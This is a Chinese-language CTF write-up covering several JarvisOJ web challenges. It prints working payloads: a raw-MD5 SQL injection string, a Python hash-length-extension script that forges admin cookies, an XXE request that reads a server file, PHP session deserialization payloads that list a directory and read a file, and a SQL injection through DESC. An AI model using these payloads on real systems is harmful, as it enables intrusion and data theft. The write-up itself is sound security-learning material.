---
title: WP for JarvisOJ
categories: [CTF]
tags: [CTF, Writeup, WEB, JarvisOJ, raw md5, SQL注入, 哈希长度扩展攻击, PHP序列化]
---

## Login

此题可以在Response Header中看到有提示

	Hint:"select * from `admin` where password='".md5($pass,true)."'"
可以看到，`md5`函数的第二个参数为`true`，即为**Raw 16 character binary format**，已经不仅仅局限于0~F这几个字符，这就有了注入的可能性。通过特殊的`$pass`值，可以构造出一个能够注入的字符串。例如：

	ffifdyop
上述字符串的MD5结果为

	'or'6�]��!r,��b
这就可以注入成功，得到结果。

其中要注意的是，`or`后面闭合的单引号内字符串内容要以一个不为0的数字开头。Mysql也有类似于PHP弱类型的特性，比如如下这条sql语句

	select * from test where id = '1anychar';
其中id为int类型，但是这语句是可以得到一条结果的。

---

## flag在管理员手里

### 哈希长度扩展攻击

此题的重点在于**[哈希长度扩展攻击](http://www.freebuf.com/articles/web/69264.html)**。

哈希长度扩展攻击可以在哈希函数的盐未知的情况下，通过已有的字符串哈希结果，在已有的字符串后增加字节来构造一个新的被哈希对象，并且能计算其哈希结果。

这种可以被攻击的哈希算法是首先对被哈希对象进行分块，并且将前一个块的运算结果作为后一个块的“参数”。所以构造的增长字符串正好将已知的哈希结果作为前面部分块的运算结果，然后继续完成哈希算法，就可以得到正确的最终哈希值。

不需要知道前面块的具体数据（包括盐），因为只需要前面块的运算结果，而这就是已知的哈希值。

python有库`hashpumpy`实现了哈希长度扩展攻击：

> Help on built-in function hashpump in module hashpumpy:
>
> hashpump(...)
>     hashpump(hexdigest, original_data, data_to_add, key_length) -> (digest, message)
>
>     Arguments:
>         hexdigest(str):      Hex-encoded result of hashing key + original_data.
>         original_data(str):  Known data used to get the hash result hexdigest.
>         data_to_add(str):    Data to append
>         key_length(int):     Length of unknown data prepended to the hash
>     
>     Returns:
>         A tuple containing the new hex digest and the new message.

### 解题过程

下面是此题解题过程：

首先找到源码泄露，**index.php~**，代码如下：

``` php
<?php
	$auth = false;
	$role = "guest";
	$salt =
	if (isset($_COOKIE["role"])) {
		$role = unserialize($_COOKIE["role"]);
		$hsh = $_COOKIE["hsh"];
		if ($role==="admin" && $hsh === md5($salt.strrev($_COOKIE["role"]))) {
			$auth = true;
		} else {
			$auth = false;
		}
	} else {
		$s = serialize($role);
		setcookie('role',$s);
		$hsh = md5($salt.strrev($s));
		setcookie('hsh',$hsh);
	}

	if ($auth) {
		echo "<h3>Welcome Admin. Your flag is"
	} else {
		echo "<h3>Only Admin can see the flag!!</h3>";
	}
?>
```

能够得到加盐后的`serialize("guest")`的结果，并且注意此处有一个`strrev`函数，会将字符串反序，这恰恰能使得我们利用哈希长度扩展攻击。首先要知道，**PHP在反序列化时，会忽略后面多余的字符**。要使得`$role==="admin"`，就必须将`s:5:"admin";`放在最前面，没有利用条件；有了反序之后，就可以在`s:5:"admin";`后面增添内容，之后进行逆序，构造长度扩展攻击。所以原始数据就是`s:5:"guest"`的逆序，最后增添数据是`s:5:"admin"`的逆序，至于盐的长度可以稍微爆破一下。

获取FLAG的python代码如下：

``` python
#!/usr/bin/python

import hashpumpy
import requests
from urllib import quote

s = requests.session()

for i in range(100):
    (a, b) = hashpumpy.hashpump("3a4727d57463f122833d9e732f94e4e0", ';"tseug":5:s', ';"nimda":5:s', i)
    a = quote(a)
    b = quote(b[::-1])
    #b = b[::-1]
    
    cookies = {'role':b, 'hsh':a}
    print i, cookies
    r = s.get('http://web.jarvisoj.com:32778/index.php', cookies=cookies)
    if 'Welcome' in  r.text:
        print r.text
        exit()
```



---

## API调用

这道题目考察了[XXE](https://security.tencent.com/index.php/blog/msg/69)，XXE的问题出于XML的引用外部实体，可能导致的问题有**数据泄露**和**远程代码执行**。

本道题目客户端与服务器之间通信的数据格式是**JSON**格式，但服务器仍然有可能能够解析**XML**格式（见[Playing with Content-Type – XXE on JSON Endpoints](https://blog.netspi.com/playing-content-type-xxe-json-endpoints/)）。

构造发送发送数据，拿到FLAG：

```
POST /api/v1.0/try HTTP/1.1
Host: web.jarvisoj.com:9882
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/xml
Referer: http://web.jarvisoj.com:9882/
Content-Length: 132
Cookie: PHPSESSID=7ar9c8i6id69uppq9rrghr9o14
Connection: close

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE netspi [<!ENTITY xxe SYSTEM "file:///home/ctf/flag.txt" >]>
<value>&xxe;</value>
```

注意上述Content-Type字段改为了`application/xml`。

---

## PHPINFO

从**PHPINFO**界面给出的相关配置信息可以发现一些配置方面的不当。

对于index.php页面，可以看到`session.serialize_handler`的配置：

	Local Value = php; Master Value = php_serialize;

可以意识到，[PHP 序列化与反序列化器设置不当带来的安全隐患](http://wps2015.org/drops/drops/PHP%20Session%20%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%84%E7%90%86%E5%99%A8%E8%AE%BE%E7%BD%AE%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93%E5%B8%A6%E6%9D%A5%E7%9A%84%E5%AE%89%E5%85%A8%E9%9A%90%E6%82%A3.html)。PHP的序列化与反序列化有三种格式，如果序列化与反序列化所使用的格式不一样，就可以恶意构造一些内容，使得反序列化时构造出攻击者想要的内容。

我的理解是：一个PHP页面运行结束时，session中的内容保存的时候需要进行序列化来存储，当另一个PHP页面运行时，需要再进行反序列化来对session内的内容进行还原。如果这两个页面的序列化器设置的不一样的话，就会导致一些问题。

所以对于此题来说，需要另一个页面有session的输入点，再次查看phpinfo：

	session.upload_progress.enabled = On

所以可以通过[Session 上传进度](http://php.net/manual/zh/session.upload-progress.php)作为输入点，自己构造一个网页：

``` html
<form action="http://web.jarvisoj.com:32784/" method="POST" enctype="multipart/form-data">
 <input type="text" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
 <input type="file" name="file1" />
 <input type="submit" />
</form>
```

构造`PHP_SESSION_UPLOAD_PROGRESS`的内容：

	|O:5:"OowoO":1:{s:4:"mdzz";s:26:"print_r(scandir(__dir__));";}
可以看到结果：

> Array
> (
>
>     [0] => .
>     [1] => ..
>     [2] => Here_1s_7he_fl4g_buT_You_Cannot_see.php
>     [3] => index.php
>     [4] => phpinfo.php
> )

接下来读文件内容（可以验证，当前目录处在'/'，此处不能使用相对路径）：

	|O:5:"OowoO":1:{s:4:"mdzz";s:79:"print_r(file_get_contents(__DIR__.'/Here_1s_7he_fl4g_buT_You_Cannot_see.php'));";}
---

## [61dctf] Inject

访问**index.php~**，可以看到源码：

``` php
<?php
require("config.php");
$table = $_GET['table']?$_GET['table']:"test";
$table = Filter($table);
mysqli_query($mysqli,"desc `secret_{$table}`") or Hacker();
$sql = "select 'flag{xxx}' from secret_{$table}";
$ret = sql_query($sql);
echo $ret[0];
?>
```

可以看到，首先要满足第一个SQL语句的语法，并在第二个SQL语句内实现注入。

查看desc的语法：

``` sql
{EXPLAIN | DESCRIBE | DESC}
    tbl_name [col_name | wild]

{EXPLAIN | DESCRIBE | DESC}
    [explain_type]
    {explainable_stmt | FOR CONNECTION connection_id}

explain_type: {
    EXTENDED
  | PARTITIONS
  | FORMAT = format_name
}

format_name: {
    TRADITIONAL
  | JSON
}

explainable_stmt: {
    SELECT statement
  | DELETE statement
  | INSERT statement
  | REPLACE statement
  | UPDATE statement
}
```

可以看到

	{EXPLAIN | DESCRIBE | DESC} tbl_name [col_name | wild]

`DESC`后可以跟`表名 [列名]`，经实验，表名必须正确，而列名则不必须。所以`$table`可以这样构造：

	test` `where 0 select 1

这样第一条sql语句就是

	desc `secret_test` `where 0 select 1`

即为`desc 表名 列名`。

第二条SQL语句：

	select 'flag{xxx}' from secret_test` `where 0 union select 1
这样，\` `就是*secret_test*表的别名。

结果返回1，注入成功。

